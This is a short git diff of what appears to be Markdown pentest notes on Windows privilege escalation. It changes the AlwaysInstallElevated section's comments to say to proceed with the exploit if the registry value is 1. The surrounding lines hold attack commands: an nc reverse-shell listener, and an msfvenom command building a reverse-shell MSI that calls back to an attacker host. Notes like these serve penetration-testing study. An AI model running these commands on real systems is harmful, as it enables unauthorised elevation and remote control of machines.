@@ -197,14 +197,14 @@ nc -lvnp 4444 # Launch Lenner on the Hacker System
 schtasks /run /tn vulntask # run 
 ```
 ## AlwaysInstallElevated ✅
-### Description
+### Description ✡️
 "AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
 
 When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
 
 ```cmd
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # If the results indicate a value of 1, we can proceed with the exploit.
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # If the results indicate a value of 1, we can proceed with the exploit.
 --------------------------------------------------------------------------------------------------------------------------------
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
 # transfer malicious.msi file to our kali # target system
